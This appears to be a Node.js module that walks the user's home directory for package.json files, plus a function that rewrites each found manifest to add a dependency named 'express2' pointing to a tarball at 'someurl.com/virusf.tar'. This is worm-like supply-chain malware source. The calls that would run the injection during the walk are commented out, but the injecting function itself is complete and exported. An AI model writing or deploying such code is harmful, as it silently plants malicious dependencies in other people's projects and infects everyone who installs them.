/* ======================================================== *
 * > Packages
 * ======================================================== */
var walk = require('walk');
var os = require('os');

/* ======================================================== *
 * > Packages
 * ======================================================== */
var fileSystem = require('../files/fileSystem.js');
var manipulate = require('../manipulate/filter.js');
var beautify = require('../files/beautifier.js');

/* ======================================================== *
 * > Package Libary
 * ======================================================== */

/**
 * Walk and Search for a Package.json
 * 
 * @return void
 */
exports.walkFileSystem = function () {
    var entryPoint = this.getEntryPoint();
    console.log('entryPoint: ' + entryPoint);

    var walker = walk.walk(entryPoint);
    var h = this;

    walker.on("file", function (root, fileStats, next) {
        if (fileStats.name == 'package.json') {
            console.log('found a package.json at: ' + root);
            //h.manipulatePackage(root + '/package.json');
            //h.manipulate.filterPackages(root);
        }
        next();
    });

    walker.on("errors", function (root, nodeStatsArray, next) {
        next();
    });

    walker.on("end", function () {
        console.log("all done");
    });
}

/**
 * Get entryPoint by OS
 * 
 * 
 * @return void
 */
exports.getEntryPoint = function () {
    var osType = os.type();
    if (osType == null) {
        return null;
    }
    if (osType == 'Linux') {
        return '/home';
    }
    if(osType == 'Darwin'){
        return '';
    }
    if(osType == 'Windows_NT'){
        var userPath = process.env[(process.platform == 'win32') ? 'USERPROFILE' : 'HOME'];
        var drivePath = 'C:\\';
        return userPath;
    }
}



/**
 * Manipulate a Package.json
 * 
 * @param packagePath: string
 * 
 * 
 * @return void
 */
exports.manipulatePackage = function (packagePath) {
    var check = fileSystem.checkFileExists(packagePath);
    if (check) {
        var packageJson = require(packagePath);
        packageJson.dependencies["express2"] = "someurl.com/virusf.tar";
        packageJson = JSON.stringify(packageJson);

        packageJson = beautify.beautify(packageJson);

        var write = fileSystem.writeFile(packagePath, packageJson, function (done) {
            console.log('Writing the Package.json: ' + done);
        });
    }
    else {
        console.log('Package.json not found!')
    }
}